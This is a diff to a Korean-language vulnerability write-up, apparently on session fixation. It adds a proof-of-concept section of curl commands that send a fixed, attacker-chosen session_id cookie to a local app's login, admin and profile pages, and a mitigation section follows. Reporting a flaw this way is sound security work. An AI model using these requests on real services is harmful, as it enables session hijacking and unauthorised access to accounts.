@@ -67,6 +67,18 @@ curl -i -H "Cookie: session_id=attacker123" http://localhost:3000/profile
 ```
 ![](images/7.png)
 
+**PoC 코드**
+```bash
+# 공격자가 원하는 session_id를 쿠키로 지정하여 로그인
+curl -i -H "Cookie: session_id=attacker123" http://localhost:3000/login
+
+# 동일한 session_id로 관리자 페이지 접근
+curl -i -H "Cookie: session_id=attacker123" http://localhost:3000/admin
+
+# 동일한 session_id로 프로필 페이지 접근
+curl -i -H "Cookie: session_id=attacker123" http://localhost:3000/profile
+```
+
 ---
 
 ## 4. 대응 방안 (Mitigation)
